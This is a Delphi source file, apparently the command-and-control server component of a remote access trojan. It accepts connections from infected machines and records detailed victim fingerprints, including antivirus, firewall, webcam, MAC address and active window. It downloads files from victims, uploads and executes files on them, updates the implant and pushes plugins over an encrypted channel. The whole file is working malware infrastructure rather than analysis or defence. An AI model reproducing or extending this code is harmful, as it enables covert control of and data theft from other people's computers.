{
  ---------------------------------------------------

  SocketUnitEx.pas v1.5 [moded by wrh1d3]
	Original unit by Aphex -> unremote@knology.net
	Modified by wrh1d3 -> wrh1d3@gmail.com

  ---------------------------------------------------
}

unit SocketUnitEx;                 

interface

uses
  Windows, Winsock, Classes, Forms, ComCtrls, SysUtils, UnitEncryption,
  UnitVariables, UnitFunctions, UnitCommands, UnitRepository, VirtualTrees,
  MMSystem, ListViewEx, Graphics;

type                                                                 
  TClientSocket = class(TObject)
  private
		FSocket: TSocket;
    FData: Pointer;
    FConnected: Boolean;
  public
    constructor Create;
    procedure Connect(Host: string; Port: Word);
    procedure SetConnection;          
    procedure Disconnect;
    function LocalAddress: string;
		function RemoteAddress: string;
		function LocalPort: Word;
    function RemotePort: Word;
    function SendBuffer(var Buffer; BufferSize: Integer): Integer;
    function RecvBuffer(var Buffer; BufferSize: Integer): Integer;
    function SendText(Text: string): Integer;
    function RecvDatas: string;
    property Socket: TSocket read FSocket write FSocket;
    property Data: Pointer read FData write FData;
    property Connected: Boolean read FConnected;
  end;

  TClientInfos = record
    LanIp, LocalPort, CountryCode, ClientId, PID, Language,
    User, Computer, Windows, UserType, InstalledDate, RegKey,
    Antivirus, Firewall, WebCam, Version, ScreenRes, Foldername,
    Filename, RootDrive, SystemDir, CPU, GPU, RAM, Idle, Uptime,
    Browser, MAC, BIOS, BIOSVer, Config, GroupId, ActiveCaption,
    InstalledName, GroupIcon, ClientIcon, ArchType, DrivesInfos: string;
  end;

  PClientDatas = ^TClientDatas;
	TClientDatas = class
    ClientSocket: TClientSocket;  
    Node: PVirtualNode;
    Infos: TClientInfos;
    UserId, Id, WanIp, CountryName,
    PingCaption, OnConnectIdle,
    OnDisconnectIdle: string;
    PositionX, PositionY, Ping,
    ImageIndex, PingImage, CamImage,
    DeskImage, TimeOutCount,
    StartTime, EndTime, PingColor: Integer;
    PingReceived: Boolean;
    Forms: array[0..18] of TForm;
    procedure InitInfos(_Infos: TStringArray);
    function SendDatas(Datas: string): Integer;
    function Uptime: string;
    function SaveGlobalDatas: string;
  end;

  PClientManager = ^TClientManager;
  TClientManager = record
    ClientSocket: TClientSocket;
    Datas: string;
  end;

  TTransferType = (ttDownload, ttUpload);
  TTransferManager = class(TObject)
  private
    ListView: TListViewEx;
    procedure InitTransfer;
  public
    ClientSocket: TClientSocket;
    RemoteFilename,
    LocalFilename: string;
    Item: TListItem;         
    TransferType: TTransferType;
    pb1: TProgressBar;
    Filesize, FilePosition: Int64;
    Speed: Integer;
    TransferState: string;
    constructor Create(_ClientSocket: TClientSocket; _RemoteFilename, _LocalFilename: string;
      _Filesize: Int64; _TransferType: TTransferType; _ListView: TListViewEx);
  end;
      
  TTransferInfos = record
    ClientSocket: TClientSocket;
    LocalFilename: string;
    FileSize: Int64;
  end;

  TClientSocketThread = class(TThread)
  private
    FRecvDatas: string;
		FClientSocket: TClientSocket;
    FClientManager: TClientManager;
    FTransferManager: TTransferManager;
    FTransferInfos: TTransferInfos;
    FClientDatas: TClientDatas;
    FTransferId: string;
    procedure RecvFile;
    procedure SendFile;
    procedure SendFile2;
    procedure SendFileBuffer;
    procedure UpdateTransfer;
    procedure GetClientDatas;
    procedure SendSqlFile;
    procedure SendPlugin;
    procedure ParseDatas;
    procedure ProcessDatas;
  protected
    procedure Execute; override;
  public
    constructor Create(CreateSuspended: Boolean = True); 
    property ClientSocket: TClientSocket write FClientSocket;
  end;
  
  TServerSocket = class(TObject)
  private               
    FSocket: TSocket;
  public
    constructor Create;
    function Listen(Port: Word): Boolean;
    function AcceptConnection: TClientSocket;
    procedure StopListening;
    property Socket: TSocket read FSocket;
  end;

  TServerSocketThread = class(TThread)
  private               
    FSocket: TSocket;
    FPort: Word;
    FListening: Boolean;
    FServerSocket: TServerSocket;
    FClientSocket: TClientSocket;
    FClientSocketThread: TClientSocketThread;
    procedure StartClientThread;
  protected
    procedure Execute; override;
  public
    constructor Create(CreateSuspended: Boolean = True);     
    procedure TestPort;
    procedure StopServer;
    property Port: Word read FPort write FPort;
    property Listening: Boolean read FListening;
    property Socket: TSocket read FSocket;
  end;

implementation

uses
  UnitMain, UnitWebcam, UnitFilesManager, UnitManager;

var
	WSAData: TWSAData;

constructor TClientSocket.Create;
begin    
	inherited Create;
  FSocket := INVALID_SOCKET;
  FConnected := False;
end;

procedure TClientSocket.SetConnection;
begin
  if FSocket <> INVALID_SOCKET then FConnected := True else
  FConnected := False;
end;

procedure TClientSocket.Connect(Host: string; Port: Word);
var
  SockAddrIn: TSockAddrIn;
  HostEnt: PHostEnt;
begin
  FSocket := WinSock.socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if FSocket = INVALID_SOCKET then Exit; 

  SockAddrIn.sin_family := PF_INET;
	SockAddrIn.sin_port := htons(Port);
  SockAddrIn.sin_addr.S_addr := inet_addr(PChar(Host));

	if SockAddrIn.sin_addr.s_addr = INADDR_NONE then
  begin
    HostEnt := gethostbyname(PChar(Host));
    if HostEnt = nil then Exit;
    SockAddrIn.sin_addr.s_addr := Longint(PLongint(HostEnt^.h_addr_list^)^);
  end;
	                                   
  if WinSock.connect(FSocket, SockAddrIn, SizeOf(SockAddrIn)) = 0 then FConnected := True;
end;

procedure TClientSocket.Disconnect;
begin
  shutdown(FSocket, SD_BOTH);
  if FSocket <> INVALID_SOCKET then closesocket(FSocket);
  FConnected := False;
end;

function TClientSocket.LocalAddress: string;
var
  SockAddrIn: TSockAddrIn;
  Size: integer;
begin
  Size := sizeof(SockAddrIn);
  getsockname(FSocket, SockAddrIn, Size);
  Result := inet_ntoa(SockAddrIn.sin_addr);
end;

function TClientSocket.RemoteAddress: string;
var
  SockAddrIn: TSockAddrIn;
  Size: Integer;
begin
  Size := sizeof(SockAddrIn);
  getpeername(FSocket, SockAddrIn, Size);
  Result := inet_ntoa(SockAddrIn.sin_addr);
end;

function TClientSocket.LocalPort: Word;
var
  SockAddrIn: TSockAddrIn;
  Size: Integer;
begin
  Size := sizeof(SockAddrIn);
  getsockname(FSocket, SockAddrIn, Size);
  Result := ntohs(SockAddrIn.sin_port);
end;

function TClientSocket.RemotePort: Word;
var
  SockAddrIn: TSockAddrIn;
  Size: Integer;
begin
  Size := sizeof(SockAddrIn);
  getpeername(FSocket, SockAddrIn, Size);
  Result := ntohs(SockAddrIn.sin_port);
end;

function TClientSocket.SendBuffer(var Buffer; BufferSize: Integer): Integer;
begin
  Result := send(FSocket, Buffer, BufferSize, 0);
end;

function TClientSocket.RecvBuffer(var Buffer; BufferSize: Integer): Integer;
begin
  Result := recv(FSocket, Buffer, BufferSize, 0);
end;

function TClientSocket.SendText(Text: string): Integer;
begin
  Result := -1;
  if (not FConnected) or (Text = '') then Exit;
  Result := SendBuffer(Pointer(Text)^, Length(Text));       
end;

function TClientSocket.RecvDatas: string;
var
  Buffer: array[0..500000] of Byte; //TODO: Update SocketUnitEx to version 1.7
  bRecv: Integer;
  TmpStr: string;
begin
  bRecv := 0;
  Result := '';
  if not FConnected then Exit;
  ZeroMemory(@Buffer[0], SizeOf(Buffer));
  bRecv := RecvBuffer(Buffer[0], SizeOf(Buffer));
  if bRecv <= 0 then Exit;
  SetLength(Result, bRecv);
  MoveMemory(@Result[1], @Buffer[0], bRecv);

  TmpStr := XorEnDecrypt(Result);

  if Pos('^_@', TmpStr) > 0 then Result := CLIENTDOWNLOADPLUGIN + '|' else
  begin
    if Copy(Result, 1, 3) <> '@_^' then
      Result := DecryptDatas(Result, ConnectionPassword)
    else
    begin
      Delete(Result, 1, 3); 
      Result := EnDecryptText(Result, ConnectionPassword); //For custom client plugin datas
    end;
  end;
end;

procedure TClientDatas.InitInfos(_Infos: TStringArray);
var
  TmpStr: string;
begin
  Infos.CountryCode := _Infos[0];
  TmpStr := _Infos[1];
  Infos.GroupId := Copy(TmpStr, 1, Pos(':', TmpStr) -1);
  Delete(TmpStr, 1, Pos(':', TmpStr));
  Infos.GroupIcon := TmpStr;
  TmpStr := _Infos[2];
  Infos.ClientId := Copy(TmpStr, 1, Pos(':', TmpStr) -1);
  Delete(TmpStr, 1, Pos(':', TmpStr));
  Infos.ClientIcon := TmpStr;
  Infos.User := _Infos[3];
  Infos.Computer := _Infos[4];
  Infos.Windows := _Infos[5];
  Infos.Antivirus := _Infos[6];
  Infos.UserType := _Infos[7];
  Infos.WebCam := _Infos[8];
  Infos.LanIp := _Infos[9];
  Infos.LocalPort := _Infos[10];
  Infos.InstalledDate := _Infos[11];
  Infos.ScreenRes := _Infos[12];
  Infos.PID := _Infos[13];
  Infos.Foldername := _Infos[14];
  Infos.Filename := _Infos[15];
  Infos.RegKey := _Infos[16];
  Infos.Language := _Infos[17];
  Infos.RootDrive := _Infos[18];
  Infos.SystemDir := _Infos[19];
  Infos.Firewall := _Infos[20];
  Infos.CPU := _Infos[21];
  Infos.RAM := FileSizeToStr(StrToInt(_Infos[22]));
  Infos.Idle := _Infos[23];
  Infos.Uptime := _Infos[24];
  Infos.MAC := _Infos[25];
  Infos.Browser := _Infos[26];
  Infos.BIOS := _Infos[27];
  Infos.BIOSVer := _Infos[28];
  Infos.ActiveCaption := _Infos[29];
  Infos.InstalledName := _Infos[30];
  Infos.Version := _Infos[31];
  Infos.ArchType := _Infos[32];
  Infos.DrivesInfos := _Infos[33];
  Infos.GPU := _Infos[34];
  Infos.Config := _Infos[35];
end;

function TClientDatas.SendDatas(Datas: string): Integer;
begin
  Datas := EncryptDatas(Datas, ConnectionPassword);
  Result := ClientSocket.SendText(Datas);
end;                                                        

function TClientDatas.Uptime: string;
begin
  Result := MSecToTime(EndTime - StartTime);
end;

function TClientDatas.SaveGlobalDatas: string;
begin
  Result := UserId + '|' + CountryName + '|' + IntToStr(ImageIndex) + '|' +
    OnConnectIdle + '|' + OnDisconnectIdle + '|' + Infos.User + ' / ' +
    Infos.Computer + ' / ' + Infos.Windows + '|' + Infos.Version + '|' + Uptime + '|';
end;

constructor TTransferManager.Create(_ClientSocket: TClientSocket; _RemoteFilename, _LocalFilename: string;
  _Filesize: Int64; _TransferType: TTransferType; _ListView: TListViewEx);
begin
  ClientSocket := _ClientSocket;
  ListView := _ListView;
  LocalFilename := _LocalFilename;
  RemoteFilename := _RemoteFilename;
  TransferType := _TransferType;
  Filesize := _Filesize;
  pb1 := TProgressBar.Create(nil);
  pb1.Max := _Filesize;
  FilePosition := 0;
  ListView.SmallImages := FormMain.ImagesList;
  Self.InitTransfer;
end;

procedure TTransferManager.InitTransfer;
var
  rect: TRect;
begin
  if ListView = nil then Exit;
  Item := ListView.Items.Add;

  case TransferType of
    ttDownload: Item.Caption := ExtractFileName(RemoteFilename);
    ttUpload: Item.Caption := ExtractFileName(LocalFilename);
  end;

  Item.SubItems.Add('');
  Item.SubItems.Add('-/' + FileSizeToStr(Filesize));
  Item.SubItems.Add('-');
  Item.SubItems.Add('0 KB/s');
  Item.SubItems.Add('Connecting...');

  case TransferType of
    ttDownload: Item.ImageIndex := GetImageIndex(RemoteFilename);
    ttUpload: Item.ImageIndex := GetImageIndex(LocalFilename);
  end;

  Item.SubItems.Objects[0] := pb1;
  Item.Data := Self;

  rect := Item.DisplayRect(drBounds);
  rect.Left := rect.Left + ListView.Columns[0].Width;
  rect.Right := rect.Left + ListView.Columns[1].Width;

  pb1.BoundsRect := rect;
  pb1.Parent := ListView;
end;

constructor TClientSocketThread.Create(CreateSuspended: Boolean);
begin
	inherited Create(CreateSuspended);
  FClientSocket := nil;
  FTransferManager := nil;
  FRecvDatas := '';
  FreeOnTerminate := True;
end;
                                                             
procedure TClientSocketThread.Execute;        
begin
  repeat
    FRecvDatas := FClientSocket.RecvDatas;
    if FRecvDatas = '' then Break;
    Synchronize(ParseDatas); //ParseDatas need to be synchonized for file transfer
  until False;

  FormMain.AddLog('Socket ' + IntToStr(FClientSocket.Socket) + ' disconnected.');
  SendMessage(FormMain.Handle, WM_REMOVE_CLIENT, WParam(@FClientManager), 0);
  Application.ProcessMessages;
  Self.Terminate;
end;

procedure TClientSocketThread.GetClientDatas;
var
  i: Integer;
begin
  for i := 0 to ClientsList.Count - 1 do
  begin
    if TClientDatas(ClientsList[i]).Id = FTransferId then
    begin
      FClientDatas := TClientDatas(ClientsList[i]);
      Break;
    end;                                                    
  end;
end;

procedure TClientSocketThread.UpdateTransfer;
  function TimeLeft(Speed, Total: Integer): string; //From SS-RAT
  var
    dDay, dHour, dMin,
    dSec, dTmp, dTmp2 :Integer;
  begin
    Result := '-';
    if (Speed = 0) or (Total = 0) then Exit;
    dDay := 0; dHour := 0;
    dMin := 0; dTmp2 := 0; dTmp := 0;

    while dTmp2 <= Total do
    begin
      Inc(dTmp2, Round(Speed));
      Inc(dTmp, 1);
    end;

    dSec := dTmp;

    if dSec > 60 then
    repeat
      Dec(dSec, 60);
      Inc(dMin, 1);
    until dSec < 60;

    if dMin > 60 then
    repeat
      Dec(dMin, 60);
      Inc(dHour, 1);
    until dMin < 60;

    if dHour > 24 then
    repeat
      Dec(dHour, 24);
      Inc(dDay, 1);
    until dHour < 24;

    Result := IntToStr(dDay) + 'd ' + IntToStr(dHour) + 'h ' +
      IntToStr(dMin) + 'm ' + IntToStr(dSec) + 's';
  end;
begin
  FTransferManager.pb1.Position := FTransferManager.FilePosition;
  FTransferManager.Item.SubItems[1] := FileSizeToStr(FTransferManager.FilePosition) + '/' +
    FileSizeToStr(FTransferManager.Filesize);
  FTransferManager.Item.SubItems[2] := TimeLeft(FTransferManager.Speed,
    FTransferManager.Filesize - FTransferManager.FilePosition);
  FTransferManager.Item.SubItems[3] := FileSizeToStr(Round(FTransferManager.Speed)) + '/s';
  if FTransferManager.Item.SubItems[4] <> FTransferManager.TransferState then
    FTransferManager.Item.SubItems[4] := FTransferManager.TransferState;
  Application.ProcessMessages;
end;

procedure TClientSocketThread.RecvFile;
var
  Buffer: array[0..32767] of Byte;
  bRecv, iRecv, i: Integer;
  Stream: TMemoryStream;
  TmpStr: string;
  TickBefore, TickCount: Cardinal;
begin                                        
  FTransferManager.TransferState := 'Downloading...';
  TickBefore := GetTickCount;

  Stream := TMemoryStream.Create;
  bRecv := 0;
  iRecv := 0;
  i := SizeOf(Buffer);

  repeat
    ZeroMemory(@Buffer[0], SizeOf(Buffer));
    if (FTransferManager.Filesize - iRecv) >= i then bRecv := i else
      bRecv := FTransferManager.Filesize - iRecv;
    FClientSocket.RecvBuffer(Buffer[0], bRecv);
    iRecv := iRecv + bRecv;
    Stream.Write(Buffer[0], bRecv);
    bRecv := 0;
    FTransferManager.FilePosition := iRecv;
    TickCount := GetTickCount - TickBefore;
    if TickCount >= 1000 then
    FTransferManager.Speed := (FTransferManager.FilePosition div (TickCount)) * 1024;
    Synchronize(UpdateTransfer);
  until (FTransferManager.FilePosition >= FTransferManager.Filesize) or (FClientSocket.Connected = False);

  Stream.SaveToFile(FTransferManager.LocalFilename);
  Stream.Free;

  if FTransferManager.FilePosition < FTransferManager.Filesize then
  begin
    FTransferManager.TransferState := 'Download failed';

    if VisualNotification then
    begin
      TmpStr := 'Download failed|' + FTransferManager.RemoteFilename;
      SendMessage(FormMain.Handle, WM_TRANSFER_ERROR, Integer(TmpStr), 0);   
      Application.ProcessMessages;
    end;
  end
  else
  begin
    FTransferManager.TransferState := 'Downloaded';

    if VisualNotification then
    begin
      TmpStr := 'File downloaded|' + FTransferManager.RemoteFilename;
      SendMessage(FormMain.Handle, WM_TRANSFER_OK, Integer(TmpStr), 0);  
      Application.ProcessMessages;
    end;

    if SoundNotification then
    PlaySound(PChar(6), hInstance, SND_ASYNC or SND_MEMORY or SND_RESOURCE);
  end;
                                                        
  Synchronize(UpdateTransfer);
end;

procedure TClientSocketThread.SendFile;
var
  Buffer: array[0..32767] of Byte;
  bRead, bSent: Integer;
  Stream: TMemoryStream;
  TickBefore, TickCount: Cardinal;
  TmpStr: string;
begin
  FTransferManager.TransferState := 'Uploading...';
  TickBefore := GetTickCount;

  Stream := TMemoryStream.Create;
  Stream.LoadFromFile(FTransferManager.LocalFilename);

  bRead := 0;
  bSent := 0;

  repeat
    ZeroMemory(@Buffer[0], SizeOf(Buffer));
    bRead := Stream.Read(Buffer[0], SizeOf(Buffer));
    if bRead <= 0 then Break;
    bSent := FClientSocket.SendBuffer(Buffer[0], bRead);
    if bSent <= 0 then Break;
    FTransferManager.FilePosition := FTransferManager.FilePosition + bSent;
    TickCount := GetTickCount - TickBefore;
    if TickCount >= 1000 then
    FTransferManager.Speed := (FTransferManager.FilePosition div (TickCount)) * 1024;
    Synchronize(UpdateTransfer);
  until False;

  Stream.Free;

  if FTransferManager.FilePosition < FTransferManager.Filesize then
  begin
    FTransferManager.TransferState := 'Upload failed';

    if VisualNotification then
    begin
      TmpStr := 'Upload failed|' + FTransferManager.LocalFilename;
      SendMessage(FormMain.Handle, WM_TRANSFER_ERROR, Integer(TmpStr), 0); 
      Application.ProcessMessages;
    end;
  end
  else
  begin
    FTransferManager.TransferState := 'Uploaded';

    if VisualNotification then
    begin
      TmpStr := 'File uploaded|' + FTransferManager.LocalFilename;
      SendMessage(FormMain.Handle, WM_TRANSFER_OK, Integer(TmpStr), 0);
      Application.ProcessMessages;
    end;

    if SoundNotification then
    PlaySound(PChar(6), hInstance, SND_ASYNC or SND_MEMORY or SND_RESOURCE);
  end;

  Synchronize(UpdateTransfer);
end;

procedure TClientSocketThread.SendFile2;
var
  Buffer: array[0..32767] of Byte;
  bRead, bSent: Integer;
  Stream: TMemoryStream;
  TmpStr: string;
  FilePosition: Int64;
begin
  Stream := TMemoryStream.Create;
  Stream.LoadFromFile(FTransferInfos.LocalFilename);

  bRead := 0;
  bSent := 0;

  repeat
    ZeroMemory(@Buffer[0], SizeOf(Buffer));
    bRead := Stream.Read(Buffer[0], SizeOf(Buffer));
    if bRead <= 0 then Break;
    bSent := FClientSocket.SendBuffer(Buffer[0], bRead);
    if bSent <= 0 then Break;
    FilePosition := FilePosition + bSent;
  until False;

  Stream.Free;

  if FilePosition < FTransferInfos.Filesize then
  begin
    if FClientDatas.Forms[16] <> nil then
    TFormManager(FClientDatas.Forms[16]).AddRecvLog('Failed to upload file ' +
      FTransferInfos.LocalFilename, clRed);

    if VisualNotification then
    begin
      TmpStr := 'Upload failed|' + FTransferInfos.LocalFilename;
      SendMessage(FormMain.Handle, WM_TRANSFER_ERROR, Integer(TmpStr), 0);   
      Application.ProcessMessages;
    end;
  end                                                             
  else
  begin
    if FClientDatas.Forms[16] <> nil then
    TFormManager(FClientDatas.Forms[16]).AddRecvLog('File ' + FTransferInfos.LocalFilename +
      ' uploaded successfully');

    if VisualNotification then
    begin
      TmpStr := 'File uploaded|' + FTransferInfos.LocalFilename;
      SendMessage(FormMain.Handle, WM_TRANSFER_OK, Integer(TmpStr), 0);    
      Application.ProcessMessages;
    end;

    if SoundNotification then
    PlaySound(PChar(6), hInstance, SND_ASYNC or SND_MEMORY or SND_RESOURCE);
  end;
end;
         
procedure TClientSocketThread.SendFileBuffer;
var
  Buffer: array[0..4095] of Byte;
  bRead, bSent: Integer;
  Stream: TMemoryStream;
  TmpStr: string;
  FilePosition: Int64;
begin
  Stream := TMemoryStream.Create;
  Stream.LoadFromFile(FTransferInfos.LocalFilename);

  bSent := 0;
  bRead := 0;

  repeat
    ZeroMemory(@Buffer[0], SizeOf(Buffer));
    bRead := Stream.Read(Buffer[0], SizeOf(Buffer));
    if bRead <= 0 then Break;
    bSent := FClientSocket.SendBuffer(Buffer[0], bRead);
    if bSent <= 0 then Break;
    FilePosition := FilePosition + bSent;
  until False;
  
  Stream.Free;
  
  if FilePosition < FTransferInfos.Filesize then
  begin
    if FClientDatas.Forms[16] <> nil then
    TFormManager(FClientDatas.Forms[16]).AddRecvLog('Failed to install file plugin', clRed);
  end
  else
  begin
    if FClientDatas.Forms[16] <> nil then
    TFormManager(FClientDatas.Forms[16]).AddRecvLog('Plugin installed successfully');
  end;
end;

procedure TClientSocketThread.SendPlugin;
var
  TmpRes: TResourceStream;
  Stream: TMemoryStream;
  Buffer: array[0..4095] of Byte;
  bRead: Integer;
  ToSend: string;
begin
  TmpRes := TResourceStream.Create(HInstance, 'PLUGIN', 'pluginfile');
  Stream := TMemoryStream.Create;
  Stream.LoadFromStream(TmpRes);
  Stream.Position := 0;
  TmpRes.Free;

  ToSend := 'POST HTTP/1.1 200 OK' + #13#10 + 'Content-Disposition: attachment' + #13#10 +
    'Content-Type: application/octet-stream' + #13#10 + 'Connection: close' + #13#10 +
    'Content-Length: ' + IntToStr(Stream.Size) + #13#10#13#10;
    
  if FClientSocket.SendText(ToSend) = -1 then Exit;
  bRead := 0;
  
  repeat
    ZeroMemory(@Buffer[0], SizeOf(Buffer));
    bRead := Stream.Read(Buffer[0], SizeOf(Buffer));
    if bRead <= 0 then Break;
    if FClientSocket.SendBuffer(Buffer[0], bRead) <= 0 then Break;
  until False;

  Stream.Free;
end;

procedure TClientSocketThread.SendSqlFile;
var
  TmpRes: TResourceStream;
  Stream: TMemoryStream;
  Buffer: array[0..4095] of Byte;
  bRead: Integer;
begin
  TmpRes := TResourceStream.Create(HInstance, 'SQLITE3', 'Sqlite3File');
  Stream := TMemoryStream.Create;
  Stream.LoadFromStream(TmpRes);   
  Stream.Position := 0;
  TmpRes.Free;

  bRead := 0;

  repeat
    ZeroMemory(@Buffer[0], SizeOf(Buffer));
    bRead := Stream.Read(Buffer[0], SizeOf(Buffer));
    if bRead <= 0 then Break;
    if FClientSocket.SendBuffer(Buffer[0], bRead) <= 0 then Break;
  until False;

  Stream.Free;
end;

procedure TClientSocketThread.ProcessDatas;
begin
  FClientManager.ClientSocket := FClientSocket;
  FClientManager.Datas := FRecvDatas;
  SendMessage(FormMain.Handle, WM_PROCESS_DATAS, WParam(@FClientManager), 0);
  Application.ProcessMessages;
end;

procedure TClientSocketThread.ParseDatas;
var
  MainCommand, TmpStr, TmpStr1: string;
  i: Integer;
  TmpInt: Int64;
begin
  MainCommand := Copy(FRecvDatas, 1, Pos('|', FRecvDatas) - 1);

  if MainCommand = FILESDOWNLOADFILE then
  begin
    Delete(FRecvDatas, 1, Pos('|', FRecvDatas));
    FTransferId := Copy(FRecvDatas, 1, Pos('|', FRecvDatas) - 1);
    Delete(FRecvDatas, 1, Pos('|', FRecvDatas));
    TmpStr := Copy(FRecvDatas, 1, Pos('|', FRecvDatas) - 1);
    Delete(FRecvDatas, 1, Pos('|', FRecvDatas));
    TmpInt := StrToInt(FRecvDatas);

    Synchronize(GetClientDatas);
    if FClientDatas = nil then Exit;
    if FClientDatas.Forms[2] = nil then Exit;

    TmpStr1 := GetDownloadsFolder(FClientDatas.UserId) + '\' + ExtractFileName(TmpStr);

    for i := 0 to TFormFilesManager(FClientDatas.Forms[2]).lvTransfers.Items.Count -1 do
    if (TFormFilesManager(FClientDatas.Forms[2]).lvTransfers.Items.Item[i].Caption = ExtractFileName(TmpStr)) and
      (Pos('failed', TFormFilesManager(FClientDatas.Forms[2]).lvTransfers.Items.Item[i].SubItems[4]) <= 0)
    then Exit;

    FTransferManager := TTransferManager.Create(FClientSocket, TmpStr, TmpStr1, TmpInt,
      ttDownload, TFormFilesManager(FClientDatas.Forms[2]).lvTransfers);
    Synchronize(RecvFile);
  end
  else

  if (MainCommand = FILESUPLOADFILEFROMLOCAL) or (MainCommand = FILESEXECUTEFROMLOCAL) or
    (MainCommand = CLIENTUPDATEFROMLOCAL)
  then
  begin
    Delete(FRecvDatas, 1, Pos('|', FRecvDatas));
    FTransferId := Copy(FRecvDatas, 1, Pos('|', FRecvDatas) - 1);
    Delete(FRecvDatas, 1, Pos('|', FRecvDatas));
    TmpStr := Copy(FRecvDatas, 1, Pos('|', FRecvDatas) - 1);
    Delete(FRecvDatas, 1, Pos('|', FRecvDatas));
    TmpStr1 := Copy(FRecvDatas, 1, Pos('|', FRecvDatas) - 1);
    Delete(FRecvDatas, 1, Pos('|', FRecvDatas));
    TmpInt := StrToInt(FRecvDatas);

    Synchronize(GetClientDatas);
    if FClientDatas = nil then Exit;

    if FClientDatas.Forms[2] <> nil then
    begin
      for i := 0 to TFormFilesManager(FClientDatas.Forms[2]).lvTransfers.Items.Count -1 do
      if (TFormFilesManager(FClientDatas.Forms[2]).lvTransfers.Items.Item[i].Caption = ExtractFileName(TmpStr)) and
        (Pos('failed', TFormFilesManager(FClientDatas.Forms[2]).lvTransfers.Items.Item[i].SubItems[4]) <= 0)
      then Exit;

      FTransferManager := TTransferManager.Create(FClientSocket, TmpStr1, TmpStr, TmpInt,
        ttUpload, TFormFilesManager(FClientDatas.Forms[2]).lvTransfers);
      Synchronize(SendFile);
    end
    else
    begin
      FTransferInfos.ClientSocket := FClientSocket;
      FTransferInfos.LocalFilename := TmpStr;
      FTransferInfos.FileSize := TmpInt;
      Synchronize(SendFile2);
    end;
  end
  else

  if MainCommand = CUSTOMPLUGININSTALL then
  begin
    Delete(FRecvDatas, 1, Pos('|', FRecvDatas));
    FTransferId := Copy(FRecvDatas, 1, Pos('|', FRecvDatas) - 1);
    Delete(FRecvDatas, 1, Pos('|', FRecvDatas));

    Synchronize(GetClientDatas);
    if FClientDatas = nil then Exit;

    FTransferInfos.ClientSocket := FClientSocket;
    FTransferInfos.LocalFilename := FRecvDatas;
    Synchronize(SendFileBuffer);
  end
  else

  if MainCommand = CLIENTDOWNLOADPLUGIN then Synchronize(SendPlugin) else
  
  if MainCommand = CLIENTDOWNLOADSQLFILE then
  begin
    Delete(FRecvDatas, 1, Pos('|', FRecvDatas));
    FTransferId := Copy(FRecvDatas, 1, Pos('|', FRecvDatas) - 1);
    Delete(FRecvDatas, 1, Pos('|', FRecvDatas));

    Synchronize(GetClientDatas);
    if FClientDatas = nil then Exit;
    Synchronize(SendSqlFile);
  end
  else

  Synchronize(ProcessDatas);              
end;

constructor TServerSocket.Create;
begin
	inherited Create;
  FSocket := INVALID_SOCKET;
end;

function TServerSocket.AcceptConnection: TClientSocket;
var
  SockAddr: TSockAddr;
  SockAddr_Len: Integer;
begin
  SockAddr_Len := SizeOf(SockAddr);
  Result := TClientSocket.Create;
  Result.Socket := accept(FSocket, @SockAddr, @SockAddr_Len);
	Result.SetConnection;
end;

function TServerSocket.Listen(Port: Word): Boolean;
var
  SockAddrIn: TSockAddrIn;
begin
  Result := False;
  FSocket := Winsock.socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  SockAddrIn.sin_family := PF_INET;
  SockAddrIn.sin_addr.s_addr := INADDR_ANY;
  SockAddrIn.sin_port := htons(Port);
  if bind(FSocket, SockAddrIn, SizeOf(SockAddrIn)) <> 0 then Exit;
  if Winsock.listen(FSocket, SOMAXCONN) <> 0 then Exit;
  Result := True;
end;

procedure TServerSocket.StopListening;
begin
  shutdown(FSocket, SD_BOTH);
  if FSocket <> INVALID_SOCKET then closesocket(FSocket);
end;

constructor TServerSocketThread.Create(CreateSuspended: Boolean);
begin
	inherited Create(CreateSuspended);
  FSocket := INVALID_SOCKET;
  FListening := False;                                    
  FServerSocket := nil;
  FClientSocket := nil;
  FClientSocketThread := nil;
  FPort := 0;  
  FreeOnTerminate := True;  
end;

procedure TServerSocketThread.Execute;
begin
  if FListening then 
  repeat
    FClientSocket := TClientSocket.Create;
    FClientSocket := FServerSocket.AcceptConnection;
    if not FClientSocket.Connected then
    begin
      FClientSocket.Disconnect;
      FClientSocket.Free;
      FClientSocket := nil;
      Exit;
    end;

    FormMain.AddLog('Socket ' + IntToStr(FClientSocket.Socket) + ' connected from address ' +
      FClientSocket.RemoteAddress + ':' + IntToStr(FClientSocket.LocalPort));
      
    FClientSocketThread := TClientSocketThread.Create();
	FClientSocketThread.FClientSocket := FClientSocket;
	FClientSocketThread.Resume;
  until False;

  StopServer;
end;

procedure TServerSocketThread.TestPort;
begin
  FServerSocket := TServerSocket.Create;
  FListening := FServerSocket.Listen(FPort);
  FSocket := FServerSocket.Socket;
end;

procedure TServerSocketThread.StopServer;
begin
  FServerSocket.StopListening;
  FServerSocket.Free;
  FServerSocket := nil;
  FListening := False;
end;

initialization
  WSAStartup($101, WSAData);

finalization
  WSACleanup();

end.
